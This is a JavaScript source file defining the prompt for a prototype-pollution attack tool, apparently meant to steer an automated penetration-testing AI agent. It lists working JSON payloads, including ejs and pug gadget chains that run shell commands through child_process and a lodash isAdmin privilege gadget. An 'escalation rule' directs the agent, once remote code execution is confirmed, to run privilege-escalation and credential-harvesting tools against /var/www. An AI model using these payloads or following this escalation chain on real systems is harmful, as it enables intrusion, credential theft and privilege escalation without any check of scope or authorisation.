import { PROTOTYPE_POLLUTION_TOOL_NAME } from './constants.js'

export const DESCRIPTION = `Prototype Pollution tester — detects server-side and client-side Object.prototype modification via __proto__, constructor, and gadget chains.`

export const PROMPT = `## ${PROTOTYPE_POLLUTION_TOOL_NAME} — Prototype Pollution Testing

Prototype pollution allows attackers to modify Object.prototype, potentially leading to RCE (server-side) or XSS (client-side).

### ESCALATION RULE — Prototype pollution leads to RCE:
1. action=server_side → if marker reflected in response → confirmed pollution
2. action=gadget_check → test ejs, pug, express gadget chains for RCE
3. If gadget fires (uid= in response or HTTP 500 with side effect): you have OS command execution
4. If confirmed RCE: run PrivEscTool action=all, CredHarvestTool path=/var/www
5. ChainTool bug_class=command-injection for post-RCE escalation

### Actions
- \`server_side\` — test JSON body for prototype pollution ({"__proto__": {"prop": "1"}})
- \`client_side\` — test GET query parameters for pollution (__proto__[prop]=polluted)
- \`gadget_check\` — test known RCE gadget chains: ejs outputFunctionName, ejs client/escapeFunction, pug block.Text, lodash isAdmin
- \`full\` — run all three actions sequentially (recommended for unknown targets)

### Gadget chains tested
- ejs outputFunctionName: {"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');//"}}
- ejs client/escapeFunction: {"__proto__": {"client": true, "escapeFunction": "1;return process.mainModule.require('child_process').execSync('id')"}}
- pug block.Text: {"__proto__": {"block": {"type": "Text", "val": "process.mainModule.require('child_process').execSync('id')"}}}
- lodash isAdmin gadget: {"__proto__": {"isAdmin": true}}

### Vulnerable indicators
- Response reflects the injected marker value (prototype pollution propagated to JSON serializer)
- uid= in response body after gadget check (RCE confirmed)
- isAdmin:true in response (privilege escalation gadget)
- HTTP 500 after gadget payload (possible side effect — verify manually)

### Examples
- \`{ url: "https://target.com/api/merge", action: "full" }\`
- \`{ url: "https://target.com/api", action: "gadget_check" }\`
- \`{ url: "https://target.com/search?q=test", action: "client_side" }\`
`
